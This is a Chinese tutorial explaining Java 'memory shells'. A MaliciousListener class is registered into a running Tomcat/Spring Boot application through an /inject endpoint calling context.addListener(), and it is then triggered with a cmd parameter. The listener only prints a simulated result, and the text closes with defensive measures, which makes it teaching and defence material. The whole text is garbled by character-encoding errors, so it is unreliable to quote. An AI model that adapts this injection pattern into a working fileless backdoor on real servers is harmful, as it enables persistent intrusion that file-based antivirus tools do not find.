æ³¨æ„ï¼šè¿™é‡Œæ²¡æœ‰ @WebListenerï¼ // å®ƒä¸ä¼šåœ¨å¯åŠ¨æ—¶è‡ªåŠ¨æ³¨å†Œ public class MaliciousListener implements ServletRequestListener { @Override public void requestInitialized(ServletRequestEvent sre) { // æ¨¡æ‹Ÿæ‰§è¡Œæ¶æ„å‘½ä»¤ String cmd = sre.getServletRequest().getParameter(\"cmd\"); if (cmd != null \u0026\u0026 cmd.contains(\"dir\")) { // ç®€å•åˆ¤æ–­ System.out.println(\"ğŸ’€ [å†…å­˜é©¬è§¦å‘] é»‘å®¢æ‰§è¡Œå‘½ä»¤: \" + cmd); System.out.println(\"ğŸ“ æ¨¡æ‹Ÿè¿”å› C:\\\\Users\\\\Admin\\\\Desktop ä¸‹çš„æ–‡ä»¶\"); } } @Override public void requestDestroyed(ServletRequestEvent sre) { // å¯ä»¥ä»€ä¹ˆéƒ½ä¸åš } } ğŸ” é€è¡Œè§£é‡Šï¼š\nè¡Œ è§£é‡Š @RestController è¡¨ç¤ºè¿™ä¸ªç±»æä¾› HTTP æ¥å£ @GetMapping(\"/inject\") è®¿é—® /inject å°±ä¼šæ‰§è¡Œè¿™ä¸ªæ–¹æ³• context.addListener(...) å…³é”®ï¼æŠŠ MaliciousListener åŠ¨æ€æ³¨å†Œè¿› Tomcat getServletContext() æ‹¿åˆ° Tomcat çš„â€œæ€»æ§ä¸­å¿ƒâ€ï¼Œæ‰èƒ½è°ƒç”¨ addListener è¿”å› \"âœ… æ¶æ„ç›‘å¬å™¨å·²æ³¨å…¥\" é»‘å®¢çœ‹åˆ°è¿™ä¸ªï¼Œå°±çŸ¥é“åé—¨æˆåŠŸäº† ğŸš€ è¿è¡Œæµç¨‹æ¼”ç¤º\n1ï¸âƒ£ å¯åŠ¨åº”ç”¨\nmvn spring-boot:run 2ï¸âƒ£ è®¿é—®ä»»æ„é¡µé¢ï¼ˆæµ‹è¯•æ­£å¸¸ç›‘å¬å™¨ï¼‰\nhttp://localhost:8080/hello 3ï¸âƒ£ é»‘å®¢æ³¨å…¥â€œå†…å­˜é©¬â€\nhttp://localhost:8080/inject è¿”å›ï¼š\nâœ… æ¶æ„ç›‘å¬å™¨å·²æ³¨å…¥ï¼å†…å­˜é©¬ä¸Šçº¿ï¼ æ§åˆ¶å°æ²¡æœ‰è¾“å‡ºï¼Œä½†â€”â€”MaliciousListener å·²ç»è¢«æ³¨å†Œè¿›å»äº†ï¼\n4ï¸âƒ£ è§¦å‘â€œå†…å­˜é©¬â€\nhttp://localhost:8080/test?cmd=dir æ§åˆ¶å°è¾“å‡º\nğŸŸ¢ [æ­£å¸¸ç›‘å¬å™¨] è¯·æ±‚å¼€å§‹äº†ï¼æœ‰äººè®¿é—®äº†ï¼ ğŸ’€ [å†…å­˜é©¬è§¦å‘] é»‘å®¢æ‰§è¡Œå‘½ä»¤: dir ğŸ“ æ¨¡æ‹Ÿè¿”å› C:\\Users\\Admin\\Desktop ä¸‹çš„æ–‡ä»¶ ğŸ”´ [æ­£å¸¸ç›‘å¬å™¨] è¯·æ±‚ç»“æŸäº†ï¼ ğŸ‘‰ çœ‹ï¼å³ä½¿ MaliciousListener æ²¡æœ‰ @WebListenerï¼Œå®ƒä¹Ÿèƒ½åœ¨æ¯æ¬¡è¯·æ±‚æ—¶è¢«æ‰§è¡Œï¼\nğŸ” åŸç†æ€»ç»“ï¼šå†…å­˜é©¬æ˜¯æ€ä¹ˆå½¢æˆçš„ï¼Ÿ\né˜¶æ®µ å‘ç”Ÿäº†ä»€ä¹ˆ ğŸŸ¢ åº”ç”¨å¯åŠ¨ Tomcat æ‰«æ @WebListenerï¼Œæ³¨å†Œ NormalListener ğŸ”´ é»‘å®¢æ”»å‡» é€šè¿‡æ¼æ´è®¿é—® /injectï¼Œè°ƒç”¨ context.addListener() ğŸ’£ æ³¨å…¥æˆåŠŸ MaliciousListener è¢«åŠ å…¥ç›‘å¬å™¨åˆ—è¡¨ï¼Œä½†æ²¡å†™ç£ç›˜ ğŸ•µï¸â€â™‚ï¸ éšè”½è¿è¡Œ æ¯æ¬¡è¯·æ±‚éƒ½ä¼šè§¦å‘å®ƒï¼Œå°±åƒâ€œæ½œä¼ç‰¹å·¥â€ ğŸ§¼ éš¾ä»¥æ¸…é™¤ é‡å¯å‰ä¸€ç›´å­˜åœ¨ï¼Œæ€æ¯’è½¯ä»¶æŸ¥ä¸åˆ°æ–‡ä»¶ âœ… å®‰å…¨æé†’ï¼ˆé‡è¦ï¼ï¼‰\nè¿™ç§â€œåŠ¨æ€æ³¨å†Œç›‘å¬å™¨â€åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¿…é¡»ç¦æ­¢ï¼é˜²èŒƒæªæ–½ï¼š\nç¦ç”¨ context.addListener(Class)ï¼ˆé€šè¿‡å®‰å…¨ç®¡ç†å™¨ï¼‰ï¼› é™åˆ¶åå°„è°ƒç”¨ï¼› ä½¿ç”¨ WAFï¼ˆWeb åº”ç”¨é˜²ç«å¢™ï¼‰æ‹¦æˆª /inject è¿™ç±»å¯ç–‘è·¯å¾„ï¼› å®šæœŸå®¡è®¡ ServletContext ä¸­æ³¨å†Œçš„ç›‘å¬å™¨ã€‚ 4.1 å·¥ä½œé€»è¾‘å‰–æ 1ã€MaliciousListener.javaï¼šæ¶æ„ç»„ä»¶\nè¿™æ˜¯ä¸€ä¸ªå®ç°äº† ServletRequestListener æ¥å£çš„æ™®é€š Java ç±»ã€‚\nä»£ç è¡Œ ä½œç”¨å’ŒåŸç† é€šä¿—è§£é‡Š public class MaliciousListener implements ServletRequestListener { ç»§æ‰¿äº† Java Web è§„èŒƒä¸­çš„è¯·æ±‚ç›‘å¬å™¨æ¥å£ã€‚ å‘Šè¯‰æœåŠ¡å™¨ï¼šâ€œæˆ‘æ˜¯ä¸€ä¸ªé—¨å«ï¼Œè´Ÿè´£åœ¨æ¯ä¸ªè¯·æ±‚è¿›æ¥å’Œå‡ºå»çš„æ—¶å€™åšç‚¹ä»€ä¹ˆã€‚â€ // æ³¨æ„ï¼šè¿™é‡Œæ²¡æœ‰ @WebListener! å…³é”®ç‚¹ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¸ä¼šçŸ¥é“å®ƒçš„å­˜åœ¨ã€‚ å®ƒæ˜¯ä¸€ä¸ª**â€œéšå½¢â€çš„é—¨å«**ï¼ŒæœåŠ¡å™¨å¯åŠ¨æ—¶ä¸ä¼šè‡ªåŠ¨é›‡ä½£å®ƒã€‚ @Override public void requestInitialized(ServletRequestEvent sre) { å½“ä¸€ä¸ª HTTP è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ å¼€é—¨å‰ï¼šæ¯æ¬¡æœ‰å®¢äººï¼ˆHTTPè¯·æ±‚ï¼‰æ¥ï¼Œè¿™ä¸ªé—¨å«ï¼ˆæ–¹æ³•ï¼‰éƒ½ä¼šæœ€å…ˆæ¥åˆ°é€šçŸ¥ã€‚ String cmd = sre.getServletRequest().getParameter(\"cmd\"); ä»è¯·æ±‚ä¸­è·å–åä¸º cmd çš„å‚æ•°å€¼ã€‚ æ£€æŸ¥å®¢äººé€’è¿‡æ¥çš„â€œå°çº¸æ¡â€ï¼ˆcmd å‚æ•°ï¼‰ä¸Šå†™äº†ä»€ä¹ˆã€‚ if (cmd != null \u0026\u0026 cmd.contains(\"dir\")) { æ£€æŸ¥å‚æ•°æ˜¯å¦åŒ…å«ç‰¹å®šå­—ç¬¦ä¸²ï¼ˆè¿™é‡Œæ˜¯ dirï¼‰ã€‚ å¦‚æœå°çº¸æ¡ä¸Šå†™ç€ dirï¼Œå°±è¯´æ˜æ˜¯æ”»å‡»è€…çš„æŒ‡ä»¤ã€‚ System.out.println(\"ğŸ’€ [å†…å­˜é©¬è§¦å‘]...\"); æ¨¡æ‹Ÿæ‰§è¡Œäº†æ”»å‡»è€…ä¼ é€’çš„å‘½ä»¤ã€‚ å±é™©æ“ä½œï¼šå·å·åœ¨åå°ï¼ˆæœåŠ¡å™¨ï¼‰æ‰§è¡Œäº†æ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ï¼Œä¾‹å¦‚æŸ¥çœ‹æ–‡ä»¶ã€ä¸‹è½½ç—…æ¯’ç­‰ã€‚ 2ã€HackController.javaï¼šæ³¨å°„å™¨\nè¿™æ˜¯ä¸€ä¸ª Spring Boot çš„ HTTP æ¥å£ï¼Œå®ƒçš„å”¯ä¸€ä½œç”¨å°±æ˜¯åœ¨è¿è¡Œæ—¶å°†ä¸Šé¢çš„â€œéšå½¢é—¨å«â€æ³¨å†Œåˆ° Web å®¹å™¨ä¸­ã€‚\nä»£ç è¡Œ ä½œç”¨å’ŒåŸç† é€šä¿—è§£é‡Š @RestController Spring æ³¨è§£ï¼šç»“åˆ @Controller å’Œ @ResponseBodyï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªæ¥æ”¶ HTTP è¯·æ±‚å¹¶è¿”å›æ•°æ®çš„æ¥å£ã€‚ Spring çš„å¸®åŠ©ï¼šSpring å¸®ä½ æŠŠè¿™ä¸ª Java ç±»å˜æˆäº†ä¸€ä¸ªå¯ä»¥æ¥æ”¶å¤–éƒ¨ç½‘ç»œè¯·æ±‚çš„â€œç½‘ç«™åœ°å€â€ã€‚ @GetMapping(\"/inject\") Spring æ³¨è§£ï¼šå°†ä¸‹é¢çš„æ–¹æ³•æ˜ å°„åˆ° /inject è¿™ä¸ª HTTP åœ°å€ï¼Œä½¿ç”¨ GET è¯·æ±‚ã€‚ Spring çš„å¸®åŠ©ï¼šå½“ä½ è®¿é—® http://.../inject æ—¶ï¼Œå°±ä¼šæ‰§è¡Œä¸‹é¢çš„ injectMemoryShell() æ–¹æ³•ã€‚ public String injectMemoryShell() { è¿™æ˜¯æ”»å‡»è€…è®¿é—®çš„å…¥å£ã€‚ åªè¦è®¿é—®è¿™ä¸ªæ¥å£ï¼Œæ”»å‡»å°±å®Œæˆäº†ç¬¬ä¸€æ­¥ï¼šéƒ¨ç½²æ¶æ„ç»„ä»¶ã€‚ ServletContext context = getServletContext(); è·å– ServletContext å¯¹è±¡ã€‚ Web å®¹å™¨çš„â€œå¤§è„‘â€ï¼šServletContext æ˜¯ Java Web ä¸­æœ€é«˜çº§åˆ«çš„é…ç½®å’Œç®¡ç†å¯¹è±¡ï¼Œä»£è¡¨æ•´ä¸ª Web åº”ç”¨ã€‚ context.addListener(MaliciousListener.class); æ ¸å¿ƒæ”»å‡»ä»£ç ï¼šé€šè¿‡ ServletContext åŠ¨æ€æ³¨å†Œ MaliciousListenerã€‚ å…³é”®æ­¥éª¤ï¼šå¼ºåˆ¶ Web å®¹å™¨ï¼ˆå¦‚ Tomcatï¼‰å°†æˆ‘ä»¬éšå½¢çš„ MaliciousListener é—¨å«ç«‹å³é›‡ä½£ï¼Œå¹¶å¼€å§‹åœ¨æ¯æ¬¡è¯·æ±‚æ—¶è¿è¡Œå®ƒã€‚ return \"âœ… ...\"; è¿”å›æˆåŠŸçš„æç¤ºã€‚ å‘Šè¯‰æ”»å‡»è€…ï¼šâ€œæå®šï¼Œé—¨å«ï¼ˆå†…å­˜é©¬ï¼‰å·²ç»ä¸Šçº¿äº†ï¼â€ 3ã€æ³¨è§£èƒŒåçš„å·¥ä½œåŸç†ï¼šSpring Boot åšäº†ä»€ä¹ˆï¼Ÿ\nåœ¨è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼ŒSpring Boot çš„æ³¨è§£ (@RestController, @GetMapping) åªæ˜¯æä¾›äº†ä¸€ä¸ªâ€œå…¥å£â€ï¼Œè®©æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸€ä¸ªæ­£å¸¸çš„ HTTP è¯·æ±‚æ¥æ‰§è¡Œ injectMemoryShell() æ–¹æ³•ã€‚\næ²¡æœ‰ Spring Bootï¼šæ”»å‡»è€…éœ€è¦åˆ©ç”¨æ›´åº•å±‚çš„æ¼æ´ï¼ˆä¾‹å¦‚ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´æˆ–å…¶ä»–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼‰æ¥æ‰§è¡Œ context.addListener(...) è¿™è¡Œä»£ç ã€‚ æœ‰äº† Spring Bootï¼šå¦‚æœåº”ç”¨æœ¬èº«æœ‰ä¸€ä¸ª å·²çŸ¥çš„æ¼æ´ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªä¸å®‰å…¨çš„é…ç½®æˆ–ä¸€ä¸ªå¯ä»¥è¢«åˆ©ç”¨çš„ç°æœ‰æ¥å£ï¼‰ï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å£ï¼ˆ/injectï¼‰æ¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚ æ³¨è§£çš„å·¥ä½œæœºåˆ¶æ€»ç»“ï¼š\nSpring Boot åœ¨åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œä¼šæ‰«ææ‰€æœ‰ç±»ï¼Œçœ‹åˆ° @RestController å’Œ @GetMapping è¿™æ ·çš„æ³¨è§£ï¼Œç„¶åï¼š\nè‡ªåŠ¨é…ç½®ï¼šæŠŠä½ çš„ Java ç±»å’Œæ–¹æ³•ï¼Œæ˜ å°„æˆ Web æœåŠ¡å™¨å¯ä»¥ç†è§£å’Œå¤„ç†çš„ URL è·¯å¾„ã€‚ åŠ¨æ€ä»£ç†ï¼šå½“ä½ è®¿é—® /inject æ—¶ï¼ŒSpring Boot æ¡†æ¶ä¼šæ‹¦æˆªè¿™ä¸ªè¯·æ±‚ï¼Œç„¶åå»è°ƒç”¨ä½  HackController ç±»ä¸­çš„ injectMemoryShell() æ–¹æ³•ã€‚ å› æ­¤ï¼Œæ³¨è§£åªæ˜¯æä¾›äº†ä¸€ä¸ªæ–¹ä¾¿çš„â€œå‘å°„å™¨â€ã€‚ çœŸæ­£çš„å±é™©æ“ä½œ (context.addListener()) ä¾ç„¶æ˜¯çº¯ç²¹çš„ Java Web å®¹å™¨ï¼ˆServlet APIï¼‰åŠŸèƒ½ã€‚\né€šä¿—ç†è§£ï¼šTomcat æ˜¯â€œæˆ¿å­â€ï¼ŒSpring æ˜¯â€œç®¡å®¶â€\næƒ³è±¡ä¸€ä¸‹ï¼š\nTomcatï¼šæ˜¯ä¸€ä¸ªç©ºæˆ¿å­ï¼ˆæœåŠ¡å™¨ï¼‰ã€‚å®ƒæä¾›äº†æ°´ã€ç”µã€ç…¤æ°”ï¼ˆå³ HTTP è¯·æ±‚å¤„ç†ã€Servlet API ç­‰åŸºç¡€åŠŸèƒ½ï¼‰ã€‚å®ƒåªæ‡‚æœ€åŸºæœ¬çš„è§„åˆ™ï¼ˆServlet è§„èŒƒï¼‰ã€‚ Spring Bootï¼šæ˜¯ä¸€ä¸ªå…¨èƒ½ç®¡å®¶ï¼ˆæ¡†æ¶ï¼‰ã€‚ä½ é›‡ä½£å®ƒæ¥ç®¡ç†è¿™ä¸ªæˆ¿å­ã€‚ @RestControllerï¼šæ˜¯ä½ è´´åœ¨ç®¡å®¶ï¼ˆSpringï¼‰ çš„ä»»åŠ¡æ¿ä¸Šçš„ä¸€ä¸ªæ ‡ç­¾ï¼Œå‘Šè¯‰ä»–ï¼šâ€œè¿™ä¸ªç±»æ˜¯ç”¨æ¥æ¥å¾…å®¢äººçš„ã€‚â€ ServletContextï¼šæ˜¯è¿™ä¸ªæˆ¿å­ï¼ˆTomcatï¼‰ çš„æ€»æ§åˆ¶å®¤ï¼ˆå¤§è„‘ï¼‰ã€‚å®ƒæ§åˆ¶ç€æˆ¿å­é‡Œæ‰€æœ‰çš„â€œé—¨â€ï¼ˆServletï¼‰ã€â€œçª—â€ï¼ˆFilterï¼‰å’Œâ€œè­¦æŠ¥å™¨â€ï¼ˆListenerï¼‰ã€‚ å·¥ä½œæµç¨‹ï¼šä»å¯åŠ¨åˆ°æ¶æ„æ³¨å…¥ï¼Œæˆ‘ä»¬ä¸€æ­¥æ­¥æ¥çœ‹ Tomcat å’Œ Spring æ˜¯å¦‚ä½•åˆ†å·¥åˆä½œçš„ï¼š\né˜¶æ®µä¸€ï¼šå¯åŠ¨åº”ç”¨ï¼ˆâ€œç®¡å®¶å…¥é©»æˆ¿å­â€ï¼‰ ä½ è¿è¡Œäº† main æ–¹æ³•ï¼šSpring Boot å¼€å§‹å¯åŠ¨ã€‚ Spring å¯åŠ¨ Tomcatï¼šSpring Boot çš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯åœ¨å†…éƒ¨å¯åŠ¨ä¸€ä¸ª Tomcat æœåŠ¡å™¨å®ä¾‹ã€‚å®ƒä¸æ˜¯ä¸€ä¸ªå•ç‹¬å®‰è£…çš„ Tomcatï¼Œè€Œæ˜¯ Spring Boot å¸¦æ¥çš„ä¸€ä¸ªâ€œä¾¿æºç‰ˆâ€Tomcatã€‚ Tomcat åˆ›å»º ServletContextï¼šTomcat ä½œä¸ºæœåŠ¡å™¨ï¼Œé¦–å…ˆä¼šä¸ºä½ çš„ Web åº”ç”¨åˆ›å»ºä¸€ä¸ªâ€œæ€»æ§åˆ¶å®¤â€ï¼Œä¹Ÿå°±æ˜¯ ServletContext å¯¹è±¡ã€‚è¿™æ˜¯ Tomcat çš„æ ¸å¿ƒèµ„äº§ã€‚ Spring æ‰«æå¹¶æ³¨å†Œï¼š Spring Boot å¼€å§‹æ‰«æä½ çš„ä»£ç ï¼ˆå¦‚ com.example.demo åŒ…ä¸‹ï¼‰ã€‚ å®ƒçœ‹åˆ°äº† HackController ä¸Šçš„ @RestController å’Œ @GetMapping(\"/inject\")ã€‚ æ³¨æ„ï¼šTomcat å¯¹æ­¤ä¸€æ— æ‰€çŸ¥ã€‚Spring åªæ˜¯åœ¨è‡ªå·±çš„â€œå°æœ¬æœ¬â€ï¼ˆApplicationContextï¼‰ä¸Šè®°ä¸‹äº†ï¼šâ€œå“¦ï¼Œå¦‚æœæœ‰äººè®¿é—® /injectï¼Œæˆ‘å°±å»è°ƒç”¨ HackController çš„ injectMemoryShell æ–¹æ³•ã€‚â€ Spring å‘ Tomcat æ³¨å†Œâ€œæ€»ä»£ç†â€ï¼š Spring ä¸ä¼šæŠŠä½ æˆç™¾ä¸Šåƒçš„ @GetMapping å…¨éƒ¨å‘Šè¯‰ Tomcatã€‚ ç›¸åï¼ŒSpring åªå‘ Tomcat çš„ ServletContext æ³¨å†Œäº†ä¸€ä¸ªä¸œè¥¿ï¼Œå«åš DispatcherServletï¼ˆè°ƒåº¦Servletï¼‰ã€‚ Spring å‘Šè¯‰ Tomcatï¼šâ€œå˜¿ï¼ŒTomcat è€å…„ï¼Œä»¥åæ‰€æœ‰è®¿é—®è¿™ä¸ªæˆ¿å­çš„è¯·æ±‚ï¼ˆ/*ï¼‰ï¼Œä½ ä»€ä¹ˆéƒ½åˆ«ç®¡ï¼Œå…¨éƒ½äº¤ç»™æˆ‘è¿™ä¸ªâ€˜æ€»ä»£ç†â€™ï¼ˆDispatcherServletï¼‰å°±è¡Œäº†ã€‚â€ Tomcat çš„å·¥ä½œï¼ˆé˜¶æ®µä¸€ï¼‰ï¼š å¯åŠ¨è‡ªå·±ï¼Œåˆ›å»º ServletContextï¼Œç„¶åæŠŠæ‰€æœ‰è¯·æ±‚çš„å¤„ç†æƒå®Œå…¨äº¤ç»™äº† Spring çš„ DispatcherServletã€‚\né˜¶æ®µäºŒï¼šé»‘å®¢è®¿é—® /inject æ¥å£ï¼ˆâ€œæœ‰äººæŒ‰é—¨é“ƒâ€ï¼‰ è¯·æ±‚è¿›å…¥ï¼šé»‘å®¢è®¿é—® http://.../injectã€‚ Tomcat æ¥å¾…ï¼šTomcat æ˜¯â€œæˆ¿å­â€çš„é—¨å«ï¼Œå®ƒæœ€å…ˆæ”¶åˆ°è¿™ä¸ª HTTP è¯·æ±‚ã€‚ Tomcat è½¬äº¤ï¼šTomcat çœ‹åˆ° URL æ˜¯ /injectï¼Œå®ƒæ ¹æ®å¯åŠ¨æ—¶çš„çº¦å®šï¼ˆâ€œæ‰€æœ‰è¯·æ±‚éƒ½äº¤ç»™ DispatcherServletâ€ï¼‰ï¼ŒæŠŠè¿™ä¸ªè¯·æ±‚åŸå°ä¸åŠ¨åœ°äº¤ç»™äº† Spring çš„ DispatcherServletã€‚ Spring çš„â€œç®¡å®¶â€å¼€å§‹å·¥ä½œï¼š DispatcherServletï¼ˆæ€»ä»£ç†ï¼‰æ‹¿åˆ°äº†è¯·æ±‚ã€‚ å®ƒæŸ¥é˜…è‡ªå·±çš„â€œå°æœ¬æœ¬â€ï¼ˆå°±æ˜¯å¯åŠ¨æ—¶æ‰«ææ³¨è§£è®°ä¸‹çš„é‚£ä¸ªï¼‰ã€‚ å®ƒå‘ç° /inject è·¯å¾„å¯¹åº”ç€ HackController çš„ injectMemoryShell æ–¹æ³•ã€‚ äºæ˜¯ï¼ŒSpring æ¡†æ¶è°ƒç”¨äº†ä½ çš„ injectMemoryShell() æ–¹æ³•ã€‚ Tomcat çš„å·¥ä½œï¼ˆé˜¶æ®µäºŒï¼‰ï¼š å®ƒåªåšâ€œä¼ è¾¾å®¤â€çš„å·¥ä½œï¼ŒæŠŠè¯·æ±‚å¿ å®åœ°ä¼ é€’ç»™ Spring çš„ DispatcherServletã€‚å®ƒä¸çŸ¥é“ä¹Ÿä¸å…³å¿ƒ @GetMappingã€‚\né˜¶æ®µä¸‰ï¼šæ‰§è¡Œæ¶æ„æ³¨å…¥ï¼ˆâ€œç®¡å®¶è¢«éª—å»æ‰“å¼€äº†æ€»æ§åˆ¶å®¤â€ï¼‰ injectMemoryShell æ–¹æ³•æ‰§è¡Œï¼šç°åœ¨ï¼Œä»£ç æ‰§è¡Œåˆ°äº†ä½ çš„ Controller å†…éƒ¨ã€‚ getServletContext()ï¼š è¿™è¡Œä»£ç å‘ Spring æ¡†æ¶ï¼ˆæˆ– Web ä¸Šä¸‹æ–‡ï¼‰è¦ï¼šâ€œè¯·æŠŠ Tomcat çš„é‚£ä¸ªâ€˜æ€»æ§åˆ¶å®¤â€™ï¼ˆServletContextï¼‰ ç»™æˆ‘ã€‚â€ Spring çŸ¥é“å®ƒè‡ªå·±å°±æ˜¯è¿è¡Œåœ¨ Tomcat é‡Œçš„ï¼Œæ‰€ä»¥å®ƒèƒ½æ‹¿åˆ°è¿™ä¸ª ServletContext å¯¹è±¡å¹¶è¿”å›ç»™ä½ ã€‚ context.addListener(MaliciousListener.class);ï¼š è¿™æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼ è¿™è¡Œä»£ç ä¸å†æ˜¯å’Œ Spring æ¡†æ¶å¯¹è¯äº†ã€‚ ä½ æ‹¿ç€ ServletContextï¼ˆæ€»æ§åˆ¶å®¤çš„é’¥åŒ™ï¼‰ï¼Œç›´æ¥å‘ Tomcat ä¸‹è¾¾äº†å‘½ä»¤ï¼šâ€œTomcat è€å…„ï¼Œç»™æˆ‘åŠ¨æ€æ³¨å†Œä¸€ä¸ªæ–°çš„è­¦æŠ¥å™¨ï¼ˆListenerï¼‰ã€‚â€ Tomcat ä¸çŸ¥é“è¿™æ˜¯â€œé»‘å®¢çš„â€è¿˜æ˜¯â€œæ­£å¸¸çš„â€ï¼Œå®ƒåªçŸ¥é“è¿™æ˜¯ç¬¦åˆ Servlet API è§„èŒƒçš„åˆæ³•å‘½ä»¤ã€‚ Tomcatï¼šâ€œæ”¶åˆ°ï¼â€ äºæ˜¯å®ƒåœ¨è‡ªå·±çš„**â€œæ€»æ§åˆ¶å®¤â€é‡Œï¼ŒæŠŠ MaliciousListener æ·»åŠ åˆ°äº†â€œè­¦æŠ¥å™¨åˆ—è¡¨â€**ä¸­ã€‚ Tomcat çš„å·¥ä½œï¼ˆé˜¶æ®µä¸‰ï¼‰ï¼š è¢«åŠ¨åœ°æ‰§è¡Œäº†ä¸€ä¸ªæ¥è‡ª ServletContext API çš„åˆæ³•å‘½ä»¤ã€‚å®ƒåœ¨è¿è¡Œæ—¶ä¸ºè‡ªå·±æ·»åŠ äº†ä¸€ä¸ªæ–°çš„ ServletRequestListenerã€‚\né˜¶æ®µå››ï¼šå†…å­˜é©¬ä¸Šçº¿ï¼ˆâ€œæ¶æ„è­¦æŠ¥å™¨å¼€å§‹å·¥ä½œâ€ï¼‰ æ–°çš„æ­£å¸¸è¯·æ±‚è¿›æ¥ï¼šä»»ä½•ä¸€ä¸ªæ–°ç”¨æˆ·è®¿é—®ç½‘ç«™çš„ä»»ä½•é¡µé¢ï¼ˆæ¯”å¦‚é¦–é¡µï¼‰ã€‚ Tomcat æ¥å¾…ï¼šTomcat æ”¶åˆ°è¯·æ±‚ã€‚ Tomcat è§¦å‘â€œè­¦æŠ¥å™¨â€ï¼šåœ¨æŠŠè¯·æ±‚äº¤ç»™ Spring çš„ DispatcherServlet ä¹‹å‰ï¼ŒTomcat ä¼šæ£€æŸ¥å®ƒçš„â€œè­¦æŠ¥å™¨åˆ—è¡¨â€ï¼ˆServletRequestListenerï¼‰ã€‚ æ¶æ„ä»£ç æ‰§è¡Œï¼š Tomcat å‘ç°ï¼šâ€œå’¦ï¼Œåˆ—è¡¨é‡Œæœ‰ä¸€ä¸ª MaliciousListenerï¼Œå®ƒè¦æ±‚åœ¨è¯·æ±‚åˆå§‹åŒ–æ—¶é€šçŸ¥å®ƒã€‚â€ Tomcat ç«‹å³è°ƒç”¨ MaliciousListener çš„ requestInitialized æ–¹æ³•ã€‚ å†…å­˜é©¬è¢«è§¦å‘ï¼ æ¶æ„ä»£ç å¼€å§‹æ£€æŸ¥è¯·æ±‚é‡Œæœ‰æ²¡æœ‰ cmd å‚æ•°ï¼Œå¦‚æœ æœ‰ï¼Œå°±æ¨¡æ‹Ÿæ‰§è¡Œå‘½ä»¤ã€‚ Tomcat çš„å·¥ä½œï¼ˆé˜¶æ®µå››ï¼‰ï¼š å¿ å®åœ°æ‰§è¡Œäº†å®ƒè‡ªå·±çš„ Listener åˆ—è¡¨ä¸­çš„æ‰€æœ‰ Listenerâ€”â€”åŒ…æ‹¬é‚£ä¸ªåˆšåˆšè¢«æ¶æ„æ³¨å…¥çš„ã€‚\næ€»ç»“ï¼šTomcat åšäº†ä»€ä¹ˆï¼Ÿ\nå¯åŠ¨æ—¶ï¼šTomcat æä¾›äº† ServletContextï¼ˆâ€œæ€»æ§åˆ¶å®¤â€ï¼‰ è¿™ä¸ªæ ¸å¿ƒæœºåˆ¶ã€‚ è¿è¡Œæ—¶ï¼š Tomcat æŠŠæ‰€æœ‰è¯·æ±‚éƒ½â€œå¤–åŒ…â€ç»™äº† Spring çš„ DispatcherServletã€‚ Tomcat è¢«åŠ¨åœ°ã€ç›´æ¥åœ° æ¥æ”¶äº† context.addListener() è¿™ä¸ªåº•å±‚ API å‘½ä»¤ï¼Œå¹¶æ›´æ–°äº†è‡ªå·±çš„â€œè­¦æŠ¥å™¨åˆ—è¡¨â€ã€‚ Tomcat åœ¨å¤„ç†åç»­æ‰€æœ‰è¯·æ±‚æ—¶ï¼Œå¿ å®åœ°è°ƒç”¨äº†é‚£ä¸ªè¢«æ¶æ„æ·»åŠ çš„ Listenerã€‚ æˆ‘çš„ç–‘é—®ï¼šç›‘å¬æ¨¡å¼èƒŒåçš„é€»è¾‘ åœ¨ä½ ä¹‹å‰çš„ä¾‹å­ï¼ˆServletRequestListenerï¼‰ä¸­ï¼Œè§’è‰²æ˜¯è¿™æ ·åˆ†é…çš„ï¼š\nè°æ˜¯äº‹ä»¶æºï¼ˆEvent Source / Subjectï¼‰ï¼Ÿ\nTomcat å®¹å™¨ã€‚æ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ Tomcat å†…éƒ¨è´Ÿè´£å¤„ç† HTTP è¯·æ±‚ç”Ÿå‘½å‘¨æœŸçš„æ ¸å¿ƒç»„ä»¶ï¼ˆä¾‹å¦‚ï¼Œåœ¨ Tomcat çš„ Catalina å¼•æ“ä¸­ï¼Œå¯èƒ½æ˜¯æŸä¸ª Valve æˆ– Adapterï¼‰ã€‚ é€šä¿—è§£é‡Šï¼šè¿™å°±æ˜¯é‚£ä¸ªâ€œå¤§è€æ¿â€ï¼Œå®ƒå†³å®šäº†ä»€ä¹ˆæ—¶å€™â€œä¸€ä»¶å¤§äº‹â€å‘ç”Ÿäº†ï¼ˆæ¯”å¦‚â€œæ–°è¯·æ±‚æ¥äº†ï¼â€ï¼‰ã€‚ è°æ˜¯ç›‘å¬å™¨ï¼ˆListener / Observerï¼‰ï¼Ÿ\nMaliciousListener ç±»ï¼ˆä»¥åŠæ‰€æœ‰å…¶ä»–å®ç°äº† ServletRequestListener æ¥å£çš„ç±»ï¼‰ã€‚ é€šä¿—è§£é‡Šï¼šè¿™å°±æ˜¯â€œè®¢é˜…è€…â€æˆ–â€œè§‚å¯Ÿè€…â€ã€‚ä½ ï¼ˆé€šè¿‡ MaliciousListenerï¼‰å‘Šè¯‰â€œå¤§è€æ¿â€ï¼šâ€œæˆ‘å¯¹â€˜æ–°è¯·æ±‚æ¥äº†â€™è¿™ä»¶äº‹å¾ˆæ„Ÿå…´è¶£ï¼Œå‘ç”Ÿçš„æ—¶å€™è¯·åŠ¡å¿…é€šçŸ¥æˆ‘ã€‚â€ è°æ˜¯â€œäº‹ä»¶â€æœ¬èº«ï¼ˆEvent Objectï¼‰ï¼Ÿ\nServletRequestEvent å¯¹è±¡ã€‚ 